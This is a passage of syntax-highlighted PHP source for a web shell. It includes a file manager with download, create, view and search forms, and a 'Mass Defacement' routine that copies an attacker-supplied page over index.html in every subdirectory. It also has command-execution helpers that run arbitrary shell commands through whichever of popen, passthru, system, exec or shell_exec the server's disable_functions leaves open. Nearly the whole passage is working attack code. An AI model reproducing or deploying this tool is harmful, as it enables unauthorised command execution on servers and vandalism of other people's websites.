      <span class="nx">document</span><span class="o">.</span><span class="nx">forms</span><span class="o">.</span><span class="nx">fphpfsys</span><span class="o">.</span><span class="nx">phpfsysfunc</span><span class="o">.</span><span class="nx">value</span><span class="o">.</span><span class="nx">selected</span> <span class="o">=</span> <span class="s2">&quot;Download&quot;</span><span class="p">;</span>
      <span class="nx">document</span><span class="o">.</span><span class="nx">forms</span><span class="o">.</span><span class="nx">fphpfsys</span><span class="o">.</span><span class="nx">arg1</span><span class="o">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">txt1</span><span class="p">;</span>
      <span class="nx">document</span><span class="o">.</span><span class="nx">forms</span><span class="o">.</span><span class="nx">fphpfsys</span><span class="o">.</span><span class="nx">arg2</span><span class="o">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">txt2</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">function</span> <span class="nf">chg_arg</span><span class="p">(</span><span class="nx">num</span><span class="p">,</span><span class="nx">txt1</span><span class="p">,</span><span class="nx">txt2</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="nx">num</span><span class="o">==</span><span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">document</span><span class="o">.</span><span class="nx">forms</span><span class="o">.</span><span class="nx">fphpfsys</span><span class="o">.</span><span class="nx">arg1</span><span class="o">.</span><span class="nx">type</span> <span class="o">=</span> <span class="s2">&quot;hidden&quot;</span><span class="p">;</span>
        <span class="nx">document</span><span class="o">.</span><span class="nx">forms</span><span class="o">.</span><span class="nx">fphpfsys</span><span class="o">.</span><span class="nx">A1</span><span class="o">.</span><span class="nx">type</span> <span class="o">=</span> <span class="s2">&quot;hidden&quot;</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">if</span> <span class="p">(</span><span class="nx">num</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">document</span><span class="o">.</span><span class="nx">forms</span><span class="o">.</span><span class="nx">fphpfsys</span><span class="o">.</span><span class="nx">arg2</span><span class="o">.</span><span class="nx">type</span> <span class="o">=</span> <span class="s2">&quot;hidden&quot;</span><span class="p">;</span>
        <span class="nx">document</span><span class="o">.</span><span class="nx">forms</span><span class="o">.</span><span class="nx">fphpfsys</span><span class="o">.</span><span class="nx">A2</span><span class="o">.</span><span class="nx">type</span> <span class="o">=</span> <span class="s2">&quot;hidden&quot;</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">if</span> <span class="p">(</span><span class="nx">num</span><span class="o">==</span><span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">document</span><span class="o">.</span><span class="nx">forms</span><span class="o">.</span><span class="nx">fphpfsys</span><span class="o">.</span><span class="nx">A1</span><span class="o">.</span><span class="nx">type</span> <span class="o">=</span> <span class="s2">&quot;label&quot;</span><span class="p">;</span>
        <span class="nx">document</span><span class="o">.</span><span class="nx">forms</span><span class="o">.</span><span class="nx">fphpfsys</span><span class="o">.</span><span class="nx">A2</span><span class="o">.</span><span class="nx">type</span> <span class="o">=</span> <span class="s2">&quot;label&quot;</span><span class="p">;</span>
        <span class="nx">document</span><span class="o">.</span><span class="nx">forms</span><span class="o">.</span><span class="nx">fphpfsys</span><span class="o">.</span><span class="nx">arg1</span><span class="o">.</span><span class="nx">type</span> <span class="o">=</span> <span class="s2">&quot;text&quot;</span><span class="p">;</span>
        <span class="nx">document</span><span class="o">.</span><span class="nx">forms</span><span class="o">.</span><span class="nx">fphpfsys</span><span class="o">.</span><span class="nx">arg2</span><span class="o">.</span><span class="nx">type</span> <span class="o">=</span> <span class="s2">&quot;text&quot;</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="nx">document</span><span class="o">.</span><span class="nx">forms</span><span class="o">.</span><span class="nx">fphpfsys</span><span class="o">.</span><span class="nx">A1</span><span class="o">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">txt1</span> <span class="o">+</span> <span class="s2">&quot;:&quot;</span><span class="p">;</span>
      <span class="nx">document</span><span class="o">.</span><span class="nx">forms</span><span class="o">.</span><span class="nx">fphpfsys</span><span class="o">.</span><span class="nx">A2</span><span class="o">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">txt2</span> <span class="o">+</span> <span class="s2">&quot;:&quot;</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">script</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
    <span class="o">&lt;?</span><span class="nx">php</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;form name=</span><span class="se">\&quot;</span><span class="s2">fphpfsys</span><span class="se">\&quot;</span><span class="s2"> method=</span><span class="se">\&quot;</span><span class="s2">POST</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=hidden name=act value=</span><span class="se">\&quot;</span><span class="s2">phpfsys</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=hidden name=d value=</span><span class="se">\&quot;</span><span class="si">$dispd\</span><span class="s2">&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">\r\n</span><span class="s2">&quot;.</span>
<span class="s2">           &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">select</span> <span class="nx">name</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;phpfsysfunc</span><span class="se">\&quot;</span><span class="s2">&amp;gt;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">;</span>
      <span class="k">foreach</span> <span class="p">(</span><span class="nv">$phpfsaliases</span> <span class="k">as</span> <span class="nv">$als</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$als</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">==</span><span class="nv">$phpfsysfunc</span><span class="p">)</span> <span class="p">{</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;option selected value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$als</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">chg_arg(&#39;</span><span class="si">$als[2]</span><span class="s2">&#39;,&#39;</span><span class="si">$als[3]</span><span class="s2">&#39;,&#39;</span><span class="si">$als[4]</span><span class="s2">&#39;)</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$als</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/option&amp;gt;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">else</span> <span class="p">{</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;option value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$als</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">chg_arg(&#39;</span><span class="si">$als[2]</span><span class="s2">&#39;,&#39;</span><span class="si">$als[3]</span><span class="s2">&#39;,&#39;</span><span class="si">$als[4]</span><span class="s2">&#39;)</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$als</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/option&amp;gt;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">;</span>
        <span class="p">}</span>
      <span class="p">}</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/select&amp;gt;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="o">.</span>
           <span class="s2">&quot;&amp;lt;input type=label name=A1 value=</span><span class="se">\&quot;</span><span class="s2">File:</span><span class="se">\&quot;</span><span class="s2"> size=2 disabled&amp;gt; &amp;lt;input type=text name=arg1 size=40 value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$arg1</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="o">.</span>
           <span class="s2">&quot;&amp;lt;input type=hidden name=A2 size=2 disabled&amp;gt; &amp;lt;input type=hidden name=arg2 size=50 value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$arg2</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="o">.</span>
           <span class="s2">&quot;&amp;lt;input type=submit name=submit value=</span><span class="se">\&quot;</span><span class="s2">Execute</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;hr noshade size=1&amp;gt;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">;</span>
      <span class="k">foreach</span> <span class="p">(</span><span class="nv">$sh_sourcez</span> <span class="k">as</span> <span class="nv">$e</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$o</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;input type=button value=</span><span class="se">\&quot;</span><span class="si">$e\</span><span class="s2">&quot;</span> <span class="nx">onclick</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;set_arg(&#39;</span><span class="si">$o[0]</span><span class="s2">&#39;,&#39;</span><span class="si">$o[1]</span><span class="s2">&#39;)</span><span class="se">\&quot;</span><span class="s2">&amp;gt;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/form&amp;gt;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">;</span>
    <span class="cp">?&gt;</span><span class="x"></span>
<span class="x">    &amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="x">    &amp;lt;tr&amp;gt;&amp;lt;td align=right&amp;gt;Search File:&amp;lt;/td&amp;gt;</span>
<span class="x">    &amp;lt;td&amp;gt;&amp;lt;form method=&quot;POST&quot;&amp;gt;&amp;lt;input type=hidden name=act value=&quot;search&quot;&amp;gt;&amp;lt;input type=hidden name=&quot;d&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$dispd</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">        &amp;lt;input type=&quot;text&quot; name=&quot;search_name&quot; size=&quot;29&quot; value=&quot;(.*)&quot;&amp;gt; &amp;lt;input type=&quot;checkbox&quot; name=&quot;search_name_regexp&quot; value=&quot;1&quot; checked&amp;gt; regexp &amp;lt;input type=submit name=submit value=&quot;Search&quot;&amp;gt;</span>
<span class="x">        &amp;lt;/form&amp;gt;</span>
<span class="x">        &amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="x">    &amp;lt;tr&amp;gt;&amp;lt;td align=right&amp;gt;Create File:&amp;lt;/td&amp;gt;</span>
<span class="x">    &amp;lt;td&amp;gt;&amp;lt;form method=&quot;POST&quot;&amp;gt;&amp;lt;input type=hidden name=act value=&quot;mkfile&quot;&amp;gt;&amp;lt;input type=hidden name=&quot;d&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$dispd</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;input type=hidden name=&quot;ft&quot; value=&quot;edit&quot;&amp;gt;</span>
<span class="x">        &amp;lt;input type=&quot;text&quot; name=&quot;mkfile&quot; size=&quot;70&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$dispd</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt; &amp;lt;input type=&quot;checkbox&quot; name=&quot;overwrite&quot; value=&quot;1&quot; checked&amp;gt; Overwrite &amp;lt;input type=submit value=&quot;Create&quot;&amp;gt; </span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$wdt</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="x">        &amp;lt;/form&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="x">    &amp;lt;tr&amp;gt;&amp;lt;td align=right&amp;gt;View File:&amp;lt;/td&amp;gt;</span>
<span class="x">    &amp;lt;td&amp;gt;&amp;lt;form method=&quot;POST&quot;&amp;gt;&amp;lt;input type=hidden name=act value=&quot;gofile&quot;&amp;gt;&amp;lt;input type=hidden name=&quot;d&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$dispd</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;</span>
<span class="x">        &amp;lt;input type=&quot;text&quot; name=&quot;f&quot; size=&quot;70&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$dispd</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt; &amp;lt;input type=submit value=&quot;View&quot;&amp;gt;</span>
<span class="x">        &amp;lt;/form&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="x">    </span><span class="cp">&lt;?</span>
    <span class="nv">$self</span><span class="o">=</span><span class="nb">basename</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">]);</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;execmassdeface&#39;</span><span class="p">]))</span>
    <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;center&amp;gt;&amp;lt;textarea rows=&#39;10&#39; cols=&#39;100&#39;&amp;gt;&quot;</span><span class="p">;</span>
    <span class="nv">$hackfile</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;massdefaceurl&#39;</span><span class="p">];</span>
    <span class="nv">$dir</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;massdefacedir&#39;</span><span class="p">];</span>
    <span class="k">echo</span> <span class="nv">$dir</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
     
    <span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$dh</span> <span class="o">=</span> <span class="nb">opendir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">while</span> <span class="p">((</span><span class="nv">$file</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="nv">$dh</span><span class="p">))</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
                            <span class="k">if</span><span class="p">(</span><span class="nb">filetype</span><span class="p">(</span><span class="nv">$dir</span><span class="o">.</span><span class="nv">$file</span><span class="p">)</span><span class="o">==</span><span class="s2">&quot;dir&quot;</span><span class="p">){</span>
                                    <span class="nv">$newfile</span><span class="o">=</span><span class="nv">$dir</span><span class="o">.</span><span class="nv">$file</span><span class="o">.</span><span class="s2">&quot;/index.html&quot;</span><span class="p">;</span>
                                    <span class="k">echo</span> <span class="nv">$newfile</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
                                    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">copy</span><span class="p">(</span><span class="nv">$hackfile</span><span class="p">,</span> <span class="nv">$newfile</span><span class="p">))</span> <span class="p">{</span>
                                            <span class="k">echo</span> <span class="s2">&quot;failed to copy </span><span class="si">$file</span><span class="s2">...</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
                                    <span class="p">}</span>
                            <span class="p">}</span>
            <span class="p">}</span>
            <span class="nb">closedir</span><span class="p">(</span><span class="nv">$dh</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/textarea&amp;gt;&amp;lt;/center&amp;gt;&quot;</span><span class="p">;}</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="x">     </span>
<span class="x">     </span>
<span class="x">    &amp;lt;tr&amp;gt;&amp;lt;td align=right&amp;gt;Mass Defacement:&amp;lt;/td&amp;gt;</span>
<span class="x">    &amp;lt;td&amp;gt;&amp;lt;form action=&#39;</span><span class="cp">&lt;?</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="x">&#39; method=&#39;post&#39;&amp;gt;[+] Main Directory: &amp;lt;input type=&#39;text&#39; style=&#39;width: 250px&#39; value=&#39;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$dispd</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&#39; name=&#39;massdefacedir&#39;&amp;gt; [+] Defacement Url: &amp;lt;input type=&#39;text&#39; style=&#39;width: 250px&#39; name=&#39;massdefaceurl&#39;&amp;gt;&amp;lt;input type=&#39;submit&#39; name=&#39;execmassdeface&#39; value=&#39;Execute&#39;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="x">     </span>
<span class="x">     </span>
<span class="x">    &amp;lt;/table&amp;gt;</span>
<span class="x">    </span><span class="cp">&lt;?php</span> <span class="nx">footer</span><span class="p">();</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="x">    &amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;</span>
<span class="x">    </span><span class="cp">&lt;?php</span>
     
     
    <span class="k">function</span> <span class="nf">safemode</span><span class="p">()</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s2">&quot;safe_mode&quot;</span><span class="p">)</span> <span class="k">OR</span> <span class="nb">eregi</span><span class="p">(</span><span class="s2">&quot;on&quot;</span><span class="p">,</span><span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s2">&quot;safe_mode&quot;</span><span class="p">))</span> <span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="k">TRUE</span><span class="p">;</span> <span class="p">}</span>
      <span class="k">else</span> <span class="p">{</span> <span class="k">return</span> <span class="k">FALSE</span><span class="p">;</span> <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">function</span> <span class="nf">getdisfunc</span><span class="p">()</span> <span class="p">{</span>
      <span class="nv">$disfunc</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s2">&quot;disable_functions&quot;</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$disfunc</span><span class="p">))</span> <span class="p">{</span>
        <span class="nv">$disfunc</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nv">$disfunc</span><span class="p">);</span>
        <span class="nv">$disfunc</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;,&quot;</span><span class="p">,</span><span class="nv">$disfunc</span><span class="p">);</span>
      <span class="p">}</span>
      <span class="k">else</span> <span class="p">{</span> <span class="nv">$disfunc</span><span class="o">=</span> <span class="k">array</span><span class="p">();</span> <span class="p">}</span>
      <span class="k">return</span> <span class="nv">$disfunc</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">function</span> <span class="nf">enabled</span><span class="p">(</span><span class="nv">$func</span><span class="p">)</span> <span class="p">{</span>
     <span class="k">if</span> <span class="p">(</span> <span class="nb">is_callable</span><span class="p">(</span><span class="nv">$func</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$func</span><span class="p">,</span><span class="nx">getdisfunc</span><span class="p">())</span> <span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="k">TRUE</span><span class="p">;</span> <span class="p">}</span>
     <span class="k">else</span> <span class="p">{</span> <span class="k">return</span> <span class="k">FALSE</span><span class="p">;</span> <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">function</span> <span class="nf">tpexec</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">)</span> <span class="p">{</span>
      <span class="nv">$output</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span> <span class="nx">enabled</span><span class="p">(</span><span class="s2">&quot;popen&quot;</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
        <span class="nv">$h</span> <span class="o">=</span> <span class="nb">popen</span><span class="p">(</span><span class="nv">$cmd</span><span class="o">.</span><span class="s1">&#39; 2&amp;gt;&amp;1&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span> <span class="nb">is_resource</span><span class="p">(</span><span class="nv">$h</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
          <span class="k">while</span> <span class="p">(</span> <span class="o">!</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$h</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span> <span class="nv">$output</span> <span class="o">.=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$h</span><span class="p">,</span> <span class="mi">2096</span><span class="p">);</span>  <span class="p">}</span>
          <span class="nb">pclose</span><span class="p">(</span><span class="nv">$h</span><span class="p">);</span>
        <span class="p">}</span>
      <span class="p">}</span>
      <span class="k">elseif</span> <span class="p">(</span> <span class="nx">enabled</span><span class="p">(</span><span class="s2">&quot;passthru&quot;</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span> <span class="o">@</span><span class="nb">ob_start</span><span class="p">();</span> <span class="nb">passthru</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span> <span class="nv">$output</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ob_get_contents</span><span class="p">();</span> <span class="o">@</span><span class="nb">ob_end_clean</span><span class="p">();</span> <span class="p">}</span>
      <span class="k">elseif</span> <span class="p">(</span> <span class="nx">enabled</span><span class="p">(</span><span class="s2">&quot;system&quot;</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span> <span class="o">@</span><span class="nb">ob_start</span><span class="p">();</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span> <span class="nv">$output</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ob_get_contents</span><span class="p">();</span> <span class="o">@</span><span class="nb">ob_end_clean</span><span class="p">();</span> <span class="p">}</span>
      <span class="k">elseif</span> <span class="p">(</span> <span class="nx">enabled</span><span class="p">(</span><span class="s2">&quot;exec&quot;</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span> <span class="nb">exec</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">,</span><span class="nv">$o</span><span class="p">);</span> <span class="nv">$output</span> <span class="o">=</span> <span class="nb">join</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$o</span><span class="p">);</span> <span class="p">}</span>
      <span class="k">elseif</span> <span class="p">(</span> <span class="nx">enabled</span><span class="p">(</span><span class="s2">&quot;shell_exec&quot;</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span> <span class="nv">$output</span> <span class="o">=</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span> <span class="p">}</span>
      <span class="k">return</span> <span class="nv">$output</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">function</span> <span class="nf">tpexec2</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">)</span> <span class="p">{</span>
      <span class="nv">$output</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span> <span class="nx">enabled</span><span class="p">(</span><span class="s2">&quot;system&quot;</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span> <span class="o">@</span><span class="nb">ob_start</span><span class="p">();</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span> <span class="nv">$output</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ob_get_contents</span><span class="p">();</span> <span class="o">@</span><span class="nb">ob_end_clean</span><span class="p">();</span> <span class="p">}</span>
      <span class="k">elseif</span> <span class="p">(</span> <span class="nx">enabled</span><span class="p">(</span><span class="s2">&quot;exec&quot;</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span> <span class="nb">exec</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">,</span><span class="nv">$o</span><span class="p">);</span> <span class="nv">$output</span> <span class="o">=</span> <span class="nb">join</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$o</span><span class="p">);</span> <span class="p">}</span>
      <span class="k">elseif</span> <span class="p">(</span> <span class="nx">enabled</span><span class="p">(</span><span class="s2">&quot;shell_exec&quot;</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span> <span class="nv">$output</span> <span class="o">=</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span> <span class="p">}</span>
      <span class="k">elseif</span> <span class="p">(</span> <span class="nx">enabled</span><span class="p">(</span><span class="s2">&quot;passthru&quot;</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span> <span class="o">@</span><span class="nb">ob_start</span><span class="p">();</span> <span class="nb">passthru</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span> <span class="nv">$output</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ob_get_contents</span><span class="p">();</span> <span class="o">@</span><span class="nb">ob_end_clean</span><span class="p">();</span> <span class="p">}</span>
      <span class="k">elseif</span> <span class="p">(</span> <span class="nx">enabled</span><span class="p">(</span><span class="s2">&quot;popen&quot;</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
        <span class="nv">$h</span> <span class="o">=</span> <span class="nb">popen</span><span class="p">(</span><span class="nv">$cmd</span><span class="o">.</span><span class="s1">&#39; 2&amp;gt;&amp;1&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span> <span class="nb">is_resource</span><span class="p">(</span><span class="nv">$h</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
          <span class="k">while</span> <span class="p">(</span> <span class="o">!</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$h</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span> <span class="nv">$output</span> <span class="o">.=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$h</span><span class="p">,</span> <span class="mi">2096</span><span class="p">);</span>  <span class="p">}</span>
          <span class="nb">pclose</span><span class="p">(</span><span class="nv">$h</span><span class="p">);</span>
        <span class="p">}</span>
      <span class="p">}</span>
      <span class="k">return</span> <span class="nv">$output</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">function</span> <span class="nf">which</span><span class="p">(</span><span class="nv">$pr</span><span class="p">)</span> <span class="p">{</span>
      <span class="nv">$path</span> <span class="o">=</span> <span class="nx">tpexec</span><span class="p">(</span><span class="s2">&quot;which </span><span class="si">$pr</span><span class="s2">&quot;</span><span class="p">);</span>
      <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$path</span><span class="p">))</span> <span class="p">{</span> <span class="k">return</span> <span class="nv">$path</span><span class="p">;</span> <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="k">return</span> <span class="nv">$pr</span><span class="p">;</span> <span class="p">}</span>
    <span class="p">}</span>
     
    <span class="k">function</span> <span class="nf">get_status</span><span class="p">()</span> <span class="p">{</span>
      <span class="k">function</span> <span class="nf">showstat</span><span class="p">(</span><span class="nv">$sup</span><span class="p">,</span><span class="nv">$stat</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$stat</span><span class="o">==</span><span class="s2">&quot;on&quot;</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="s2">&quot;</span><span class="si">$sup</span><span class="s2">: &amp;lt;font color=orange&amp;gt;&amp;lt;b&amp;gt;ON&amp;lt;/b&amp;gt;&amp;lt;/font&amp;gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
        <span class="k">else</span> <span class="p">{</span> <span class="k">return</span> <span class="s2">&quot;</span><span class="si">$sup</span><span class="s2">: &amp;lt;font color=orange&amp;gt;&amp;lt;b&amp;gt;OFF&amp;lt;/b&amp;gt;&amp;lt;/font&amp;gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
      <span class="p">}</span>
      <span class="nv">$arrfunc</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
